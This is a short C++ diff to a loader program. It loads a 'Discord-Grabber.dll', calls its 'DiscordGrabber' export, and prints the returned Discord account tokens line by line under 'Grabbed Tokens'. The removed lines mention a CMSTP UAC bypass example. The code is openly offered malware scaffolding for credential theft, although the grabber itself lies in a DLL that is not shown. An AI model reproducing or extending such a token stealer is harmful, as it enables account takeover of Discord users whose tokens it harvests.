@@ -3,7 +3,7 @@
 
 int main()
 {
-	HMODULE DiscordGrabberDLL = LoadLibraryW(L"DiscordGrabber.dll");
+	HMODULE DiscordGrabberDLL = LoadLibraryW(L"Discord-Grabber.dll");
 
 
 	if (!DiscordGrabberDLL)
@@ -13,7 +13,7 @@ int main()
 	}
 
 
-	auto func = (void(*)())GetProcAddress(DiscordGrabberDLL, "DiscordGrabber");
+	auto func = (const char*(*)())GetProcAddress(DiscordGrabberDLL, "DiscordGrabber");
 
 	if(!func)
 	{
@@ -24,10 +24,20 @@ int main()
 
 
 
-	std::cout << "This Uac Bypass is using well known method CMSTP" << "\n";
-	std::cout << "This example was created by : pieczywosoleckie " << std::endl;
 
-	func();
+
+	auto tokens = func();
+
+	std::cout << "Grabbed Tokens: " << std::endl;
+
+	for (size_t a = 0; tokens[a] != '\0'; a++) {
+		if (tokens[a] == ':') {
+			std::cout << "\n";
+		}
+		else {
+			std::cout << tokens[a];
+		}
+	}
 
 	std::cin.get();
 
